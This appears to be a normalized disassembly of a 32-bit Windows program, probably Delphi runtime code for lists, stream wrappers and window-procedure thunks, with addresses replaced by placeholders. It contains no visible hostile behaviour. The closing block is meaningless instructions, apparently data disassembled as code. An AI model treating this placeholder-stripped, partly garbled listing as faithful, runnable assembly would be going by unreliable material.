dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_418550
call sub_420b0c
inc edi
dec esi
jne r-xdata
sub_420b48
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_4186ec
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_403270
xor eax eax
mov [ ebx + 0x14 ] eax
sub_420b6c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_420b48
mov edx ebx
mov eax esi
call sub_420b48
pop esi
pop ebx
retn
sub_420b88
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_420b6c
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_418550
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_420be4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_420990
push ebx
push sub_4209b8
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_4209a4
push ebx
push sub_4209c4
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_420cdc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_407ee0
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_420d74
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b760
call sub_403a24
sub_420d74
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_418550
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_407ee0
test al al
jne r-xdata
sub_420dc4
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_4043f4
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_407ffc
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b760
call sub_403a24
xor edx edx
mov eax ebx
call sub_420f44
mov edx esi
mov eax ebx
call sub_420e50
mov dl 0x1
mov eax ebx
call sub_420f44
sub_420e64
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_418550
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_4184dc
sub_420ea0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_4185ac
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_418440
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_4185cc
sub_420ef4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_420e90
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_420e64
mov cl 0x1
mov edx ebx
call sub_420ef4
inc edi
dec ebp
jne r-xdata
sub_420f44
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_404284
mov edx esp
mov eax esi
call sub_40356c
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_420f8c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_420fb4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_420ffc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_403324
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_42103c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_42105c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_421080
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403240
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_4210c8
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403260
test bl bl
jle r-xdata
mov edx esi
call sub_4212f8
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_421130
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_4212f8
mov edx ebx
mov eax esi
call sub_4212ec
sub_421174
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42086c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_4211b8
push ebx
push esi
push edi
call sub_403624
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4208b8
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_420b6c
jmp r-xdata
mov eax esi
call sub_418638
mov edx eax
mov eax edi
call sub_4212f8
lea eax [ edi + 0x50 ]
call sub_40cf90
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40360c
sub_421218
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_420b88
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_421244
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_421260
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_42127c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_418550
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_4212f8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_418440
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_418550
cmp ebp eax
jne r-xdata
sub_421338
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_420b6c
mov edx ebx
call sub_42093c
sub_421364
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403240
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_4213ac
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403260
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_403270
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_4213e4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_421433
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_42144c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_42149b
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_4214b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_42151e
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_421538
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_421581
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_41a9ec
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_42159c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_40591c
xor eax eax
push ebp
push sub_421789
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_421762
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4026f4
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_421751
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_402714
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421790
lea eax [ ebp + 0xc ]
call sub_4058a8
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_4217cc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_42182f
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_421860
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_418914
mov edi eax
xor eax eax
push ebp
push sub_4218b5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4218bc
mov eax [ rw-data ]
call sub_418978
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_418550
call sub_403270
inc esi
dec ebx
jne r-xdata
sub_4218d4
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_4218fc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4028f0
mov edx sub_4218d4
lea eax [ esi + 0x5 ]
call sub_4218f4
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_4218f4
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_4219b8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_406c34
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4218fc
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_421a6c
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_421994
sub_421a94
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_421b38
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421b3f
retn
mov eax [ rw-data ]
call sub_417b38
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_421860
xor edx edx
xor eax eax
call sub_41b93c
mov eax rw-data
call sub_40cf90
call sub_405fd8
lea eax [ eax + 0xc ]
call sub_40cf90
mov eax rw-data
call sub_40cf90
mov eax rw-data
call sub_4058a8
mov eax sub_4218cc
call sub_405744
mov eax rw-data
call sub_40cf90
call sub_42068c
mov eax rw-data
call sub_40cf90
mov eax rw-data
call sub_4058a8
sub_421b44
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_421bcd
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421bd4
retn
call sub_420658
mov eax sub_4218cc
call sub_40573c
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ccd0
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_4058c0
mov dl 0x1
mov eax [ r-xdata ]
call sub_417434
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4187bc
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4187bc
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_421bd8
push 0x8a0047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ebx + 0x680000ff ] cl
mov dh 0x47
add [ edi + edi * 8 - 0x49980000 ] cl
inc edi
add [ ebp + 0x680000ff ] cl
mov dh 0x47
add [ esi + 0x680000ff ] cl
mov dh 0x47
add [ edi + 0x680000ff ] cl
mov dh 0x47
add [ eax - 0x1 ] dh
add [ eax ] al
push 0x710047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ edx - 0x1 ] dh
add [ eax ] al
push 0x730047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ edi + edi * 8 ] dh
add [ eax - 0x4a ] ch
inc edi
add [ ebp - 0x1 ] dh
add [ eax ] al
push 0x760047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ edi - 0x1 ] dh
add [ eax ] al
push 0x780047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ecx - 0x1 ] bh
add [ eax ] al
push 0x7a0047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ebx - 0x1 ] bh
add [ eax ] al
push 0x7c0047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ebp - 0x1 ] bh
add [ eax ] al
push 0x7e0047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ edi - 0x1 ] bh
add [ eax ] al
push 0x600047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ecx - 0x1 ] ah
add [ eax ] al
push 0x620047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ebx - 0x1 ] ah
add [ eax ] al
push 0x640047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ebp - 0x1 ] ah
add [ eax ] al
push 0x660047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ edi - 0x1 ] ah
add [ eax ] al
push 0x680047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ecx - 0x1 ] ch
add [ eax ] al
push 0x6a0047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ebx - 0x1 ] ch
add [ eax ] al
push 0x6c0047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ebp - 0x1 ] ch
add [ eax ] al
push 0x6e0047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ edi - 0x1 ] ch
add [ eax ] al
push 0x500047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ecx - 0x1 ] dl
add [ eax ] al
push 0x520047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ebx - 0x1 ] dl
add [ eax ] al
push 0x540047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ebp - 0x1 ] dl
add [ eax ] al
push 0x560047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ edi - 0x1 ] dl
add [ eax ] al
push 0x580047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ecx - 0x1 ] bl
add [ eax ] al
push 0x5a0047b6
inc [ eax ]
